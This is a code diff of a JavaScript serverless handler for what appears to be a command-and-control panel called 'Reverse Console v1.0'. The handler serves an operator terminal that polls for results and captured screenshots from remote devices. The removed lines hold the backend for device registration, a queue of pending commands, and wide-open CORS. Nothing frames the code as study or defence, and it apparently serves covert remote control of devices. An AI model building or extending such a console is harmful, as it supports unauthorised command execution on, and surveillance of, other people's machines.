@@ -1,5 +1,6 @@
 export default async function handler(req, res) {
-    if (req.method === 'GET' && !req.url.includes('since') && !req.url.includes('client')) {
+    // Serve HTML for browser requests
+    if (req.method === 'GET' && !req.url.includes('?since') && !req.url.includes('?client')) {
         res.setHeader('Content-Type', 'text/html');
         res.status(200).send(`<!DOCTYPE html>
 <html lang="en">
@@ -92,7 +93,7 @@ if(data.messages&&data.messages.length>0){
 data.messages.forEach(function(msg){
 if(msg.type==='result')printOutput(msg.data,'success');
 if(msg.type==='error')printOutput(msg.data,'error');
-if(msg.type==='screenshot'){screenshotData=msg.data;printOutput('Screenshot captured. Type "screenshot view" to display.','info')}
+if(msg.type==='screenshot'){screenshotData=msg.data;printOutput('Screenshot captured. Type screenshot view to display.','info')}
 if(msg.type==='info')printOutput(msg.data,'info')});
 lastId=data.lastId||lastId;
 terminal.scrollTop=terminal.scrollHeight}
@@ -103,7 +104,7 @@ else if(e.key==='ArrowUp'){e.preventDefault();if(historyIndex>0){historyIndex--;
 else if(e.key==='ArrowDown'){e.preventDefault();if(historyIndex<commandHistory.length-1){historyIndex++;this.value=commandHistory[historyIndex]||''}else{historyIndex=commandHistory.length;this.value=''}}});
 document.addEventListener('click',function(){cmdInput.focus()});
 printOutput('Reverse Console v1.0','info');
-printOutput('Type "help" for available commands','info');
+printOutput('Type help for commands','info');
 printOutput('','info');
 setInterval(pollServer,1000);
 pollServer();
@@ -113,62 +114,7 @@ cmdInput.focus();
 </html>`);
         return;
     }
-
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
-    if (req.method === 'OPTIONS') {
-        res.status(200).end();
-        return;
-    }
-
-    let messageQueue = global.messageQueue || [];
-    let connectedDevices = global.connectedDevices || [];
-    let lastId = global.lastId || 0;
-
-    if (req.method === 'POST') {
-        const { action, data } = req.body || {};
-
-        if (action === 'register') {
-            connectedDevices = connectedDevices.filter(d => Date.now() - d.lastSeen < 60000);
-            connectedDevices.push({ id: Date.now(), info: data, lastSeen: Date.now() });
-            global.connectedDevices = connectedDevices;
-            res.status(200).json({ success: true });
-            return;
-        }
-
-        lastId++;
-        messageQueue.push({
-            id: lastId,
-            type: action === 'command' ? 'pending_command' : action,
-            data: data,
-            time: Date.now()
-        });
-
-        if (messageQueue.length > 200) messageQueue = messageQueue.slice(-200);
-
-        global.messageQueue = messageQueue;
-        global.lastId = lastId;
-        res.status(200).json({ success: true });
-        return;
-    }
-
-    if (req.method === 'GET') {
-        const since = parseInt(req.query?.since) || 0;
-        connectedDevices = (connectedDevices || []).filter(d => Date.now() - d.lastSeen < 60000);
-        const newMessages = (messageQueue || []).filter(m => m.id > since);
-        if ((messageQueue || []).length > 500) messageQueue = messageQueue.slice(-300);
-        global.connectedDevices = connectedDevices;
-        global.messageQueue = messageQueue;
-
-        res.status(200).json({
-            messages: newMessages,
-            devices: connectedDevices,
-            lastId: lastId
-        });
-        return;
-    }
-
-    res.status(200).json({ messages: [], devices: [], lastId: 0 });
+    
+    // Forward API calls
+    res.status(404).json({ error: 'Use /api/command' });
 }
